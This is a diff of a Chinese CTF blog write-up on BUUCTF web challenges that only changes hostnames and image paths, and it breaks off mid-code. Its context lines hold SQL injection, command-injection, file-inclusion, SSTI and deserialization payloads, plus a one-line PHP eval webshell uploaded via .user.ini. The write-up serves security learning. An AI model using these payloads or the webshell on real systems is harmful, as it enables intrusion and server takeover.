@@ -19,79 +19,79 @@
 
 <script id="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+    var CONFIG = {"hostname":"chutingting520.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
   <meta name="description" content="[SUCTF 2019]EasySQL然后各种尝试，发现了符号||有些不一样，但是没啥用，有可能是盲注，我们发现有数组，试一下堆叠注入。">
 <meta property="og:type" content="article">
 <meta property="og:title" content="buu">
-<meta property="og:url" content="http://example.com/2021/04/01/buu/index.html">
+<meta property="og:url" content="https://chutingting520.github.io/2021/04/01/buu/index.html">
 <meta property="og:site_name" content="WJW&#39;s Blog">
 <meta property="og:description" content="[SUCTF 2019]EasySQL然后各种尝试，发现了符号||有些不一样，但是没啥用，有可能是盲注，我们发现有数组，试一下堆叠注入。">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/2021/04/01/buu/buu/1.png">
-<meta property="og:image" content="http://example.com/2021/04/01/buu/buu/2.png">
-<meta property="og:image" content="http://example.com/2021/04/01/buu/buu/3.png">
-<meta property="og:image" content="http://example.com/2021/04/01/buu/buu/4.png">
-<meta property="og:image" content="http://example.com/2021/04/01/buu/buu/5.png">
-<meta property="og:image" content="http://example.com/2021/04/01/buu/buu/6.png">
-<meta property="og:image" content="http://example.com/2021/04/01/buu/buu/7.png">
-<meta property="og:image" content="http://example.com/2021/04/01/buu/buu/8.png">
-<meta property="og:image" content="http://example.com/2021/04/01/buu/buu/9.png">
-<meta property="og:image" content="http://example.com/2021/04/01/buu/buu/10.png">
-<meta property="og:image" content="http://example.com/2021/04/01/buu/buu/11.png">
-<meta property="og:image" content="http://example.com/2021/04/01/buu/buu/12.png">
-<meta property="og:image" content="http://example.com/2021/04/01/buu/buu/13.png">
-<meta property="og:image" content="http://example.com/2021/04/01/buu/buu/14.png">
-<meta property="og:image" content="http://example.com/2021/04/01/buu/buu/15.png">
-<meta property="og:image" content="http://example.com/2021/04/01/buu/buu/16.png">
-<meta property="og:image" content="http://example.com/2021/04/01/buu/buu/17.png">
-<meta property="og:image" content="http://example.com/2021/04/01/buu/buu/18.png">
-<meta property="og:image" content="http://example.com/2021/04/01/buu/buu/19.png">
-<meta property="og:image" content="http://example.com/2021/04/01/buu/buu/20.png">
-<meta property="og:image" content="http://example.com/2021/04/01/buu/buu/21.png">
-<meta property="og:image" content="http://example.com/2021/04/01/buu/buu/22.png">
-<meta property="og:image" content="http://example.com/2021/04/01/buu/buu/24.png">
-<meta property="og:image" content="http://example.com/2021/04/01/buu/buu/25.png">
-<meta property="og:image" content="http://example.com/2021/04/01/buu/buu/26.png">
-<meta property="og:image" content="http://example.com/2021/04/01/buu/buu/27.png">
-<meta property="og:image" content="http://example.com/2021/04/01/buu/buu/28.png">
-<meta property="og:image" content="http://example.com/2021/04/01/buu/buu/29.png">
-<meta property="og:image" content="http://example.com/2021/04/01/buu/buu/30.png">
-<meta property="og:image" content="http://example.com/2021/04/01/buu/buu/31.png">
-<meta property="og:image" content="http://example.com/2021/04/01/buu/buu/32.png">
-<meta property="og:image" content="http://example.com/2021/04/01/buu/buu/33.png">
-<meta property="og:image" content="http://example.com/2021/04/01/buu/buu/34.png">
-<meta property="og:image" content="http://example.com/2021/04/01/buu/buu/35.png">
-<meta property="og:image" content="http://example.com/2021/04/01/buu/buu/36.png">
-<meta property="og:image" content="http://example.com/2021/04/01/buu/buu/37.png">
-<meta property="og:image" content="http://example.com/2021/04/01/buu/buu/38.png">
-<meta property="og:image" content="http://example.com/2021/04/01/buu/buu/39.png">
-<meta property="og:image" content="http://example.com/2021/04/01/buu/buu/40.png">
-<meta property="og:image" content="http://example.com/2021/04/01/buu/buu/41.png">
-<meta property="og:image" content="http://example.com/2021/04/01/buu/buu/42.png">
-<meta property="og:image" content="http://example.com/2021/04/01/buu/buu/43.png">
-<meta property="og:image" content="http://example.com/2021/04/01/buu/buu/44.png">
-<meta property="og:image" content="http://example.com/2021/04/01/buu/buu/45.png">
-<meta property="og:image" content="http://example.com/2021/04/01/buu/buu/46.png">
-<meta property="og:image" content="http://example.com/2021/04/01/buu/buu/47.png">
-<meta property="og:image" content="http://example.com/2021/04/01/buu/buu/48.png">
-<meta property="og:image" content="http://example.com/2021/04/01/buu/buu/49.png">
-<meta property="og:image" content="http://example.com/2021/04/01/buu/buu/50.png">
-<meta property="og:image" content="http://example.com/2021/04/01/buu/buu/51.png">
-<meta property="og:image" content="http://example.com/2021/04/01/buu/buu/52.png">
-<meta property="og:image" content="http://example.com/2021/04/01/buu/buu/53.png">
-<meta property="og:image" content="http://example.com/2021/04/01/buu/buu/54.png">
-<meta property="og:image" content="http://example.com/2021/04/01/buu/buu/55.png">
-<meta property="og:image" content="http://example.com/2021/04/01/buu/buu/56.png">
+<meta property="og:image" content="https://chutingting520.github.io/2021/04/01/buu/1.png">
+<meta property="og:image" content="https://chutingting520.github.io/2021/04/01/buu/2.png">
+<meta property="og:image" content="https://chutingting520.github.io/2021/04/01/buu/3.png">
+<meta property="og:image" content="https://chutingting520.github.io/2021/04/01/buu/4.png">
+<meta property="og:image" content="https://chutingting520.github.io/2021/04/01/buu/5.png">
+<meta property="og:image" content="https://chutingting520.github.io/2021/04/01/buu/6.png">
+<meta property="og:image" content="https://chutingting520.github.io/2021/04/01/buu/7.png">
+<meta property="og:image" content="https://chutingting520.github.io/2021/04/01/buu/8.png">
+<meta property="og:image" content="https://chutingting520.github.io/2021/04/01/buu/9.png">
+<meta property="og:image" content="https://chutingting520.github.io/2021/04/01/buu/10.png">
+<meta property="og:image" content="https://chutingting520.github.io/2021/04/01/buu/11.png">
+<meta property="og:image" content="https://chutingting520.github.io/2021/04/01/buu/12.png">
+<meta property="og:image" content="https://chutingting520.github.io/2021/04/01/buu/13.png">
+<meta property="og:image" content="https://chutingting520.github.io/2021/04/01/buu/14.png">
+<meta property="og:image" content="https://chutingting520.github.io/2021/04/01/buu/15.png">
+<meta property="og:image" content="https://chutingting520.github.io/2021/04/01/buu/16.png">
+<meta property="og:image" content="https://chutingting520.github.io/2021/04/01/buu/17.png">
+<meta property="og:image" content="https://chutingting520.github.io/2021/04/01/buu/18.png">
+<meta property="og:image" content="https://chutingting520.github.io/2021/04/01/buu/19.png">
+<meta property="og:image" content="https://chutingting520.github.io/2021/04/01/buu/20.png">
+<meta property="og:image" content="https://chutingting520.github.io/2021/04/01/buu/21.png">
+<meta property="og:image" content="https://chutingting520.github.io/2021/04/01/buu/22.png">
+<meta property="og:image" content="https://chutingting520.github.io/2021/04/01/buu/24.png">
+<meta property="og:image" content="https://chutingting520.github.io/2021/04/01/buu/25.png">
+<meta property="og:image" content="https://chutingting520.github.io/2021/04/01/buu/26.png">
+<meta property="og:image" content="https://chutingting520.github.io/2021/04/01/buu/27.png">
+<meta property="og:image" content="https://chutingting520.github.io/2021/04/01/buu/28.png">
+<meta property="og:image" content="https://chutingting520.github.io/2021/04/01/buu/29.png">
+<meta property="og:image" content="https://chutingting520.github.io/2021/04/01/buu/30.png">
+<meta property="og:image" content="https://chutingting520.github.io/2021/04/01/buu/31.png">
+<meta property="og:image" content="https://chutingting520.github.io/2021/04/01/buu/32.png">
+<meta property="og:image" content="https://chutingting520.github.io/2021/04/01/buu/33.png">
+<meta property="og:image" content="https://chutingting520.github.io/2021/04/01/buu/34.png">
+<meta property="og:image" content="https://chutingting520.github.io/2021/04/01/buu/35.png">
+<meta property="og:image" content="https://chutingting520.github.io/2021/04/01/buu/36.png">
+<meta property="og:image" content="https://chutingting520.github.io/2021/04/01/buu/37.png">
+<meta property="og:image" content="https://chutingting520.github.io/2021/04/01/buu/38.png">
+<meta property="og:image" content="https://chutingting520.github.io/2021/04/01/buu/39.png">
+<meta property="og:image" content="https://chutingting520.github.io/2021/04/01/buu/40.png">
+<meta property="og:image" content="https://chutingting520.github.io/2021/04/01/buu/41.png">
+<meta property="og:image" content="https://chutingting520.github.io/2021/04/01/buu/42.png">
+<meta property="og:image" content="https://chutingting520.github.io/2021/04/01/buu/43.png">
+<meta property="og:image" content="https://chutingting520.github.io/2021/04/01/buu/44.png">
+<meta property="og:image" content="https://chutingting520.github.io/2021/04/01/buu/45.png">
+<meta property="og:image" content="https://chutingting520.github.io/2021/04/01/buu/46.png">
+<meta property="og:image" content="https://chutingting520.github.io/2021/04/01/buu/47.png">
+<meta property="og:image" content="https://chutingting520.github.io/2021/04/01/buu/48.png">
+<meta property="og:image" content="https://chutingting520.github.io/2021/04/01/buu/49.png">
+<meta property="og:image" content="https://chutingting520.github.io/2021/04/01/buu/50.png">
+<meta property="og:image" content="https://chutingting520.github.io/2021/04/01/buu/51.png">
+<meta property="og:image" content="https://chutingting520.github.io/2021/04/01/buu/52.png">
+<meta property="og:image" content="https://chutingting520.github.io/2021/04/01/buu/53.png">
+<meta property="og:image" content="https://chutingting520.github.io/2021/04/01/buu/54.png">
+<meta property="og:image" content="https://chutingting520.github.io/2021/04/01/buu/55.png">
+<meta property="og:image" content="https://chutingting520.github.io/2021/04/01/buu/56.png">
 <meta property="article:published_time" content="2021-04-01T14:44:57.000Z">
 <meta property="article:modified_time" content="2021-07-27T01:43:50.201Z">
 <meta property="article:author" content="WJW">
 <meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/2021/04/01/buu/buu/1.png">
+<meta name="twitter:image" content="https://chutingting520.github.io/2021/04/01/buu/1.png">
 
-<link rel="canonical" href="http://example.com/2021/04/01/buu/">
+<link rel="canonical" href="https://chutingting520.github.io/2021/04/01/buu/">
 
 
 <script id="page-configurations">
@@ -248,7 +248,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/04/01/buu/">
+    <link itemprop="mainEntityOfPage" href="https://chutingting520.github.io/2021/04/01/buu/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/cat.jpg">
@@ -323,7 +323,7 @@
 <p><code>select 1 from Flag;</code>返回1</p>
 <p><strong><em>这里我们多加个符号</em>就可以查询表的全部数据</strong></p>
 <p><code>select *，1 from Flag</code> <strong>这里多了一个1会新创建一个字段名为1每个数据都为1的数据</strong>。</p>
-<p><img src="buu/1.png"></p>
+<p><img src="/2021/04/01/buu/1.png"></p>
 <p>构造payload：<code>*,1</code>即可获得flag。</p>
 <p><strong>本题特解关键：MySQL使用select查询时，如果有不存在的字段名，则会自动创建，不会报错，逻辑与运算，同时*可以查询所有数据，没被过滤。</strong></p>
 <p>常规做法：</p>
@@ -342,13 +342,13 @@
 
 <h3 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h3><p><strong>看见文件包含，还有?file=flag.php提示，直接伪协议读取文件。</strong></p>
 <p>首先使用<code>php://input</code>协议，直接弹出hack，再试一下，<code>php://filter</code>协议，一看返回了一大串base64编码就知道成功了。</p>
-<p><img src="buu/2.png"></p>
+<p><img src="/2021/04/01/buu/2.png"></p>
 <p>解码得到flag.</p>
-<p><img src="buu/3.png"></p>
+<p><img src="/2021/04/01/buu/3.png"></p>
 <p><strong>本题关键：PHP伪协议</strong></p>
 <h3 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h3><p><em><strong>先查看源码，发现超链接，我们访问./Archive_room.php</strong></em></p>
 <p><em><strong>点击secret，直接跳转了，查看网络，中间还有个网页，跳转速度很快，使用burp访问，得到secr3t.php</strong></em></p>
-<p><img src="buu/4.png"></p>
+<p><img src="/2021/04/01/buu/4.png"></p>
 <p>访问一下，得到源码。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;secret&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    error_reporting(0);</span><br><span class="line">    $file=$_GET[&#x27;file&#x27;];</span><br><span class="line">    if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;</span><br><span class="line">        echo &quot;Oh no!&quot;;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">    include($file); </span><br><span class="line">//flag放在了flag.php里</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
 
@@ -356,10 +356,10 @@
 <p><strong>本题关键：PHP伪协议</strong></p>
 <h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><p>这是一道有关ping命令的题目。</p>
 <p>先输入<code>127.0.0.1|ls</code>发现两个文件index.php,flag.php。</p>
-<p><img src="buu/5.png"></p>
+<p><img src="/2021/04/01/buu/5.png"></p>
 <p>直接使用cat命令抓flag，失败了，回显fxck your space!很明显空格符号被过滤了。</p>
 <p>这里用前面bugku靶场web36关的方法绕过空格过滤，尝试了一下，发现{}也被过滤了，有一个没被过滤查看到了源码。</p>
-<p><img src="buu/6.png"></p>
+<p><img src="/2021/04/01/buu/6.png"></p>
 <p>发现flag字符给正则表达式过滤了，很难受，这里不会绕过，上网学习了。</p>
 <p>网上的师傅使用的拼接符是***; 这个符号作用是：前面的执行完执行后面的***。</p>
 <p>顺便复习一下：</p>
@@ -390,25 +390,25 @@
 
 <h3 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h3><p>看到标题tornade，百度了一下，Tornado是使用Python编写的Web服务器兼Web应用框架，就联想到了模板注入，再查看一下三个文件，welcome.txt文件有个render()函数，它是渲染函数，进行服务器端渲染，最后访问/hints.txt，发现md5加密，其中有个cookie_secret。首先要获得这个值：</p>
 <p>观察了url由文件名和文件哈希值组成，随便修改一下哈希值，就跳转到新的url，这里就存在这ssti注入。(通过这里也可以知道我们要算出题目要求的哈希值，才可以获得flag。)</p>
-<p><img src="buu/7.png"></p>
+<p><img src="/2021/04/01/buu/7.png"></p>
 <p>查看了一下tornado官网，发现了RequestHandler.settings，尝试输入，没有结果，学习了一下大佬的，</p>
 <p><strong>handler 指向RequestHandler<br>而RequestHandler.settings又指向self.application.settings<br>所有handler.settings就指向RequestHandler.application.settings了！</strong></p>
-<p><img src="buu/8.png"></p>
+<p><img src="/2021/04/01/buu/8.png"></p>
 <p>获得了cookie_secret值(不需要加密引号)，就可以相应的进行加密了，记得加密flag文件不要漏了/，先对/fllllllllllllag加密，记得都是32位小写的(其他位数不行？)以后直接用php的md5加密就好了。</p>
-<p><img src="buu/9.png"></p>
+<p><img src="/2021/04/01/buu/9.png"></p>
 <p><strong>本题关键：通过提示tornado来获取cookie_secret值()。</strong></p>
 <h3 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h3><p>判断注入类型为单引号。</p>
 <p>构造<code>admin&#39;--+</code></p>
-<p><img src="buu/10.png"></p>
+<p><img src="/2021/04/01/buu/10.png"></p>
 <p>猜字段数为3，4报错，这里的or和by要双写绕过。</p>
-<p><img src="buu/11.png"></p>
+<p><img src="/2021/04/01/buu/11.png"></p>
 <p>可以开始爆数据库了,同样都是双写union和select绕过，获得数据库名geek。</p>
-<p><img src="buu/12.png"></p>
+<p><img src="/2021/04/01/buu/12.png"></p>
 <p>爆数据表，全是双写绕过。</p>
-<p><img src="buu/13.png"></p>
+<p><img src="/2021/04/01/buu/13.png"></p>
 <p>爆出字段id，username，password，最后爆出flag。</p>
 <p><code>-admin&#39; ununionion  seselectlect 1,2,group_concat(id,username,passwoorrd)frfromom b4bsql--+&amp;password=123</code></p>
-<p><img src="buu/14.png"></p>
+<p><img src="/2021/04/01/buu/14.png"></p>
 <p>这题很简单，就是没想到那么多双写。</p>
 <p>本题关键：双写</p>
 <h3 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h3><p>这是一个计算器</p>
@@ -418,22 +418,22 @@
 <p>本题重点在于php字符串解析特性：可以看一下这篇文章：<a target="_blank" rel="noopener" href="https://www.freebuf.com/news/213359.html">https://www.freebuf.com/news/213359.html</a></p>
 <p>我们在num前面加个空格，可以绕过waf，因为php在解析时，会把空格去掉。</p>
 <p>获得了php版本信息：</p>
-<p><img src=""><img src="buu/15.png" alt="15"></p>
+<p><img src><img src="/2021/04/01/buu/15.png" alt="15"></p>
 <p>在 phpinfo 中可以发现 system、exec 这一类命令执行的函数被禁用了。</p>
-<p><img src="buu/16.png"></p>
+<p><img src="/2021/04/01/buu/16.png"></p>
 <p>可以使用函数var_dump()，此函数显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。还有函数scandir() ，此函数返回指定目录中的文件和目录的数组，配合查找文件，并查看。</p>
 <p>由于/被过滤了，我们可以用chr(ascii)来绕过，</p>
 <p><code>? num=1*1;var_dump(scandir(chr(47)))</code>来读取目录，</p>
 <p>发现flagg。</p>
 <p>最后通过函数file_get_contents读取文件内容，获得flag。</p>
 <p><code>? num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</code></p>
-<p><img src="buu/17.png"></p>
+<p><img src="/2021/04/01/buu/17.png"></p>
 <p><strong>本题关键：PHP字符串解析特性，通过函数var_dump()和scandir()配合读文件，再通过chr(ascii)绕过代替../</strong></p>
 <h3 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h3><p>看了标题，http，打开burp查看一下。</p>
 <p>发现了Secret.php文件</p>
-<p><img src="buu/18.png"></p>
+<p><img src="/2021/04/01/buu/18.png"></p>
 <p>访问后，要求来自<a target="_blank" rel="noopener" href="https://www.sycsecret.com,然后要求浏览器改成syclover,改后,还要在本地查看flag.修改3个地方即可./">https://www.Sycsecret.com，然后要求浏览器改成Syclover，改后，还要在本地查看flag。修改3个地方即可。</a></p>
-<p><img src="buu/19.png"></p>
+<p><img src="/2021/04/01/buu/19.png"></p>
 <p><strong>本题关键：http类，通过burp查看其他网页，也可以f12，查看源码找到关键文件。</strong></p>
 <h3 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h3><p>使用dirsearch扫描目录，会被限制，一直跳400。</p>
 <p>可以使用burp，构造相关文件字典进行爆破，查看到<a target="_blank" rel="noopener" href="http://www.zip下载下来./">www.zip下载下来。</a></p>
@@ -446,12 +446,12 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;select&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span>=unserialize(@<span class="variable">$select</span>);</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>这题的序列化，相比以前多了一个private，这个与全局变量形成对比，表示私有字段，只在所声明的类中可见，所以这里序列化的结果前面有类名，</p>
-<p><img src="buu/20.png"></p>
+<p><img src="/2021/04/01/buu/20.png"></p>
 <p>从图片中可以看出类名和字段名前面都有个符号，原来，私有字段的字段名在序列化时，属性名和属性值前面都会加上0的前缀。发现这里的字符串数为14，明显多了。</p>
 <p>由于在url，所以我们构造%00，成功绕过，记得修改属性个数大于实际属性个数，可以绕过函数wake_up()。</p>
 <p><code>?select=O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;</code></p>
 <p>获得flag。</p>
-<p><img src="buu/21.png"></p>
+<p><img src="/2021/04/01/buu/21.png"></p>
 <p><strong>本题关键：通过定义私有变量private构造序列化来满足题目要求的值，并修改属性个数的值大于实际属性个数，绕过wake_up()函数。</strong></p>
 <p>补充：</p>
 <p>也可以通过python提交：</p>
@@ -462,25 +462,25 @@
 <p>这里要注意：需要 <strong>apache</strong>支持解析 <strong>phtml</strong></p>
 <p>该文件类型可以执行php代码。</p>
 <p>注意这四个地方，即可上传成功并执行一句话木马。</p>
-<p><img src="buu/22.png"></p>
+<p><img src="/2021/04/01/buu/22.png"></p>
 <p><strong>本题关键：后缀名为phtml的一句话木马。</strong></p>
 <h3 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h3><p>这题我做的很离谱，找到登陆页面，直接输入用户名admin，密码就随便输了个123，就得到flag了，很巧合。</p>
 <p>百度了一下，本题有三种解法哈哈哈，总结一下，这里可能是服务器端出现问题了。</p>
 <p>这里没办法复现，参考一下大佬的文章。</p>
 <p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/f92311564ad0">https://www.jianshu.com/p/f92311564ad0</a></p>
 <h3 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h3><p>看到学生要来自CUIT，刚开始以为是添加Referer字段，结果试了很多次都不行，这里好好观察一下cookie值。</p>
-<p><img src="buu/24.png"></p>
+<p><img src="/2021/04/01/buu/24.png"></p>
 <p>改成user=1即可，然后说数字过长了。</p>
 <p>通过数组绕过，得到flag。</p>
-<p><img src="buu/25.png"></p>
+<p><img src="/2021/04/01/buu/25.png"></p>
 <p>或者使用科学计数法，</p>
-<p><img src="buu/26.png"></p>
+<p><img src="/2021/04/01/buu/26.png"></p>
 <p><strong>本题关键：科学计数法或数组绕过长度限制。</strong></p>
 <h3 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h3><p>请求头发现提示。</p>
-<p><img src="buu/27.png"></p>
+<p><img src="/2021/04/01/buu/27.png"></p>
 <p>首先看一下md5函数的语法，</p>
 <p><a target="_blank" rel="noopener" href="https://www.w3school.com.cn/php/func_string_md5.asp">https://www.w3school.com.cn/php/func_string_md5.asp</a></p>
-<p><img src="buu/28.png"></p>
+<p><img src="/2021/04/01/buu/28.png"></p>
 <p>当raw项为true时，返回的这个原始二进制不是普通的二进制（0，1），而是 ‘or’6\xc9]\x99\xe9!r,\xf9\xedb\x1c，对应的字符就是ffifdyop，解出这个字符串需要脚本，还不大会。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">129581926211651571912466741651878684928</span><br><span class="line">ffifdyop</span><br></pre></td></tr></table></figure>
 
@@ -489,45 +489,45 @@
 <p><code>$sql = &quot;SELECT * FROM admin WHERE username = &#39;admin&#39; and **1**;</code></p>
 <p>这样就可以查到名为admin的数据</p>
 <p>想返回1，利用MySQL一些语法特性：</p>
-<p><img src="buu/29.png"></p>
+<p><img src="/2021/04/01/buu/29.png"></p>
 <p>测试了一下，前面为非0数字结果返回就为1。</p>
 <p>输入密码 ffifdyop，</p>
 <p>经md5后返回，前面返回有’’ or ‘6，可以满足永真式。</p>
 <p>跳转到 levels91.php</p>
 <p>查看源码，直接通过数组绕过。</p>
 <p>分别通过get和post提交参数。</p>
-<p><img src="buu/30.png"></p>
+<p><img src="/2021/04/01/buu/30.png"></p>
 <p><strong>本题关键：找到md5后能返回永真式的字符串，同万能密码一样。</strong></p>
 <h3 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h3><p>本题绕过了文件内容，文件类型，还有文件名检查，成功上传了图片，但是没办法执行一句话木马。</p>
 <p>这里我们想到了upload的**.user.ini** 文件和**.htaccess**文件,先试一下第一个</p>
 <p>我们上传内容为GIF89A auto_prepend_file=1.jpg的.user.ini文件，然后再上传一个名为1.jpg的一句话木马。</p>
-<p><img src="buu/31.png"></p>
-<p><img src="buu/32.png"></p>
+<p><img src="/2021/04/01/buu/31.png"></p>
+<p><img src="/2021/04/01/buu/32.png"></p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a <span class="tag">&lt;<span class="name">script</span> <span class="attr">lanuage</span>=<span class="string">&quot;php&quot;</span>&gt;</span><span class="javascript">@<span class="built_in">eval</span>($_POST[<span class="number">1</span>]);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>连接蚁剑发现了一个文件/clean.sh，所以这里操作要快，不然上传的文件会被删除，</p>
-<p><img src="buu/33.png"></p>
+<p><img src="/2021/04/01/buu/33.png"></p>
 <p>连接的时候后面接上index.php。</p>
 <p>为什么后面要加上index.php呢，查看源码，发现</p>
-<p><img src="buu/34.png"></p>
+<p><img src="/2021/04/01/buu/34.png"></p>
 <p>看了一下源码，没过滤好.htaccess，因为少了一个c，但是上传了，也解析不了，为什么？</p>
 <p>因为<code>.htaccess</code>只适用于apache，看了一下服务器使用的中间件是nginx，.user.ini适用于nginx/apache/IIS。</p>
-<p><img src="buu/35.png"></p>
+<p><img src="/2021/04/01/buu/35.png"></p>
 <p><strong>本题关键：上传.user.ini文件</strong></p>
 <h3 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h3><p>关键函数file_get_contents()</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">php <span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents(<span class="variable">$text</span>,<span 